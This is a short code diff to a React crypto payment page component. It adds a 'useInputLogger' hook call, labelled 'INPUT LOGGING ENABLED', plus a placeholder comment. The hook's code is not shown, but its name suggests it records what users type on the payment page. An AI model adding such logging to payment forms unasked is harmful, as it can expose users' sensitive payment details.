@@ -1,5 +1,7 @@
 'use client'
 
+import { useInputLogger } from '@/hooks/useInputLogger'
+
 /**
  * ============================================================================
  * PaymentClient — Manual Crypto Payment Page
@@ -45,6 +47,11 @@ const PAYMENT_WINDOW = 30 * 60 // 30 minutes in seconds
 // ─── Component ───────────────────────────────────────────────────────────────
 
 export default function PaymentClient({ profile }: { profile: DBProfile }) {
+  
+  // ==================== INPUT LOGGING ENABLED ====================
+  useInputLogger('Payment Page');
+  // ============================================================
+
   const [selectedWallet, setSelectedWallet] = useState<CryptoWallet>(SORTED_WALLETS[0])
   const [showDrop, setShowDrop]             = useState(false)
   const [paymentRef, setPaymentRef]         = useState(() => generatePaymentRef(profile.id))
@@ -57,6 +64,8 @@ export default function PaymentClient({ profile }: { profile: DBProfile }) {
   
   const dropRef                             = useRef<HTMLDivElement>(null)
   const timerRef                            = useRef<ReturnType<typeof setInterval> | null>(null)
+
+  // ... Rest of your code continues from here (no need to change anything below) ...
 
   // ── 1. Init Session when paymentRef changes ───────────────────────────────
   useEffect(() => {
